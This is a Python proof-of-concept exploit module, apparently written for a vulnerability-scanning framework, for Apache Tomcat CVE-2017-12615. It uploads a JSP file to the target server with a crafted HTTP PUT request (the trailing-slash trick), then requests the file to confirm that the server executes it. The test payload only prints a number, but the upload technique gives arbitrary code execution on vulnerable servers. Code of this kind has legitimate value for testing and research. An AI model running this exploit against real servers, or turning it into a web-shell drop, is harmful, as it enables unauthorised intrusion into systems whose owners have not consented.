#!/usr/bin/env python
# coding:utf-8
"""
  Author:   Conan0xff
  Purpose: tomcat cve-2017-12615
  Created: 09/29/17
"""

import urllib
import urllib2
import random
import string
import urlparse

from vikit.core.basic.modinput import TargetDemand, PayloadDemand, ParamDemand
from vikit.core.basic import target, payload, param

NAME = 'tomcat_cve_2017_12615'

AUTHOR = 'Conan0xff'

DESCRIPTION = 'tomcat-cve-17-12615 poc'

RESULT_DESC = '''return host and result if is vulnerable'''

DEMANDS = [TargetDemand('target', target.TYPE_URL)]


class PutRequest(urllib2.Request):
    '''support put method in urllib2'''

    def __init__(self, *args, **kwargs):
        self._method = "PUT"
        return urllib2.Request.__init__(self, *args, **kwargs)

    def get_method(self, *args, **kwargs):
        return "PUT"


def random_str(length):
    pool = string.digits + string.ascii_lowercase
    return "".join(random.choice(pool) for _ in range(length))


def check(host, port, timeout):
    result = ""
    payload = "<%out.println(1963*4);%>"
    filename = "{}.jsp".format(random_str(16))
    if port == 443:
        url = "https://%s" % (host)
    else:
        url = "http://%s:%d" % (host, port)
    url = urllib2.urlopen(url, timeout=timeout).geturl()
    shell_url = urlparse.urljoin(url, filename)
    target_url = shell_url + "/"
    request = PutRequest(target_url, payload)
    try:
        urllib2.urlopen(request, timeout=timeout)
    except Exception as e:
        #print("[!] {}".format(str(e)))
        return False
    else:
        try:
            resp = urllib2.urlopen(shell_url, timeout=timeout)
        except Exception as e:
            #print("[!] get shell url error {}".format(str(e)))
            return False
        else:
            if "7852" in resp.read():
                result += u"vulnerable"
            result += u" at: {}".format(shell_url)
            return result


def exploit(target, payload, config):
    # parse url to host and port
    timeout = 5
    proto, rest = urllib.splittype(target)
    host, rest = urllib.splithost(rest)
    host, port = urllib.splitport(host)
    if port is None:
        port = 80
    port=int(port)
    if check(host, port, timeout) != False:
        return 'success'
    else:
        return 'failed'


EXPORT_FUNC = exploit

if __name__ == '__main__':
    print exploit('http://127.0.0.1:8080','','{}')
